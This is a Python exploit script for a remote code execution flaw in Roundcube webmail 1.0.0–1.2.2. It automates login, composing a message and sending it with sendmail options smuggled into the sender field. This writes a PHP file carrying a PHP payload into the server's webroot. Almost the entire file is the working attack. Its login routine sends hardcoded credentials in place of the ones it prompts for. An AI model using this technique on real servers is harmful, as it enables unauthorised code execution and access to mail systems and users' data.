#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time

"""
    Roundcube 1.2.2 - Remote Code Execution
    ------------
    CVE : No CVE assigned
    Affected Versions: 1.0.0 - 1.2.2

    Requirements
    ------------
    - Roundcube must be configured to use PHP's mail() function (by default)
    - PHP's mail() function is configured to use sendmail (by default)
    - PHP is configured to have safe_mode turned off (by default)
    - An attacker must know or guess the absolute path of the webroot

    References :
    https://www.exploit-db.com/exploits/40892/
    http://www.hackdig.com/12/hack-41868.htm
"""

description = "Roundcube 1.2.2 - Remote Code Execution"

url = 'http://mail.roundcube.com/roundcubemail/'


class roundcube():
    """
    roundcube rce exploit class
    """
    def init(self, url):
        """
        init some basic args
        """
        # self.base_url = 'http://mail.roundcube.com/roundcubemail/'
        self.base_url = '{}'.format(url)
        print('base_url : {}'.format(self.base_url))

        # self.url_login = 'http://mail.roundcube.com/roundcubemail/?_task=login'
        self.url_login = '{}/?_task=login'.format(self.base_url)
        print('url_login : {}'.format(self.url_login))

        # self.url_compose = 'http://mail.roundcube.com/roundcubemail/?_task=mail&_mbox=INBOX&_action=compose'
        self.url_compose = '{}/?_task=mail&_mbox=INBOX&_action=compose'.format(self.base_url)
        print('url_compose : {}\n'.format(self.url_compose))

        self.s = requests.Session()
        self.csrf_token = ''
        self.path = ''

        # 加headers 伪造请求头。
        self.s.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:59.0) Gecko/20100101 Firefox/59.0',
        }

    def get_csrf_token(self, content):
        """
        登陆时需要先获取CSRF-Token
        :return: csrf-token
        """
        index = content.find('request_token')
        self.csrf_token = content[index+16:index+16+32]
        print('csrf_token : {}\n'.format(self.csrf_token))
        return self.csrf_token

    def get_compose_id(self, content):
        """
        获取撰写的信件id
        :param content:
        :return:
        """
        index = content.find('compose_id')
        self.compose_id = content[index+13:index+13+22]
        print('compose_id : {}'.format(self.compose_id))

    def login(self):
        """
        Login to Roundcube Webmail
        :return: None
        """
        _user = input('please input username : ')
        _pass = input('please input password : ')
        self.path = input('please input webmail path(eg./var/www/html/roundcubemail) : ')

        form_data = {
            '_token': self.csrf_token,
            '_task': 'login',
            '_action': 'login',
            '_timezone': 'Asia/Shanghai',
            '_url': '_task=login',
            '_user': 'user1',
            '_pass': '123456'
        }
        # print(form_data)
        request = self.s.post(self.url_login, data=form_data)
        content = request.text
        self.get_csrf_token(content)
        # print(content)

    def compose(self):
        """
        Compose an email
        :return:
        """
        request = self.s.get(self.url_compose)
        content = request.text
        self.get_compose_id(content)

        # compose_url = 'http://mail.roundcube.com/roundcubemail/?_task=mail&_action=compose&_id={}'.format(self.compose_id)
        compose_url = '{}?_task=mail&_action=compose&_id={}'.format(self.base_url, self.compose_id)

        print(compose_url)
        request = self.s.get(compose_url)
        content = request.text
        self.get_csrf_token(content)

    def send(self, url):
        """
        Send an email
        :param url: remote url
        :return: True
        """
        _from = 'example@example.com -OQueueDirectory=/tmp -X{}/logs/rce.php'.format(self.path)
        print('_from : {}'.format(_from))
        form_data = {
            '_token': self.csrf_token,
            '_task': 'mail',
            '_action': 'send',
            '_id': self.compose_id,
            '_attachments': '',
            '_from': _from,
            '_to': 'user2@mail.roundcube.com',
            '_cc': '',
            '_bcc': '',
            '_replyto': '',
            '_followupto': '',
            '_subject': '<?php phpinfo();?>',
            'editorSelector': 'plain',
            '_priority': '0',
            '_store_target': 'Sent',
            '_draft_saveid': '',
            '_draft': '',
            '_is_html': '0',
            '_framed': '1',
            '_message': 'TEST'
        }
        request = self.s.post(url, data=form_data)
        content = request.text
        print(request.status_code)

    def auto_exploit(self, url):
        """
        Auto exploit Roundcube Webmail base on self class functions
        :param url: the remote system to test
        :return: True
        """

        # initialize
        self.init(url)

        # step1 : get csrf_token for login
        print('step 1 : {}'.format(self.base_url))
        content = self.s.get(self.base_url).text
        self.get_csrf_token(content)

        print('step 2 : {}'.format(self.url_login))
        self.login()

        print('step 3 : {}'.format(self.url_compose))
        self.compose()

        time_now = int(time.time())
        # url_send = 'http://mail.roundcube.com/roundcubemail/?_task=mail&_unlock=loading{}&_lang=en&_framed=1'.format(time_now)
        url_send = '{}/?_task=mail&_unlock=loading{}&_lang=en&_framed=1'.format(self.base_url, time_now)
        print('step 4 : {}'.format(url_send))
        self.send(url_send)

        print('step 5 : refer {}{}'.format(self.base_url, '/logs/rce.php'))

        return True


def poc():

    print('*********************************************')
    print('\tExploiting Roundcube RCE needs      ')
    print('* valid user/passwd                       ')
    print('* need to know remote roundcube path      ')
    print('*********************************************')

    url = input('please input roundcube mail url : ')

    try:
        return roundcube().auto_exploit(url)
    except:
        return False

poc()
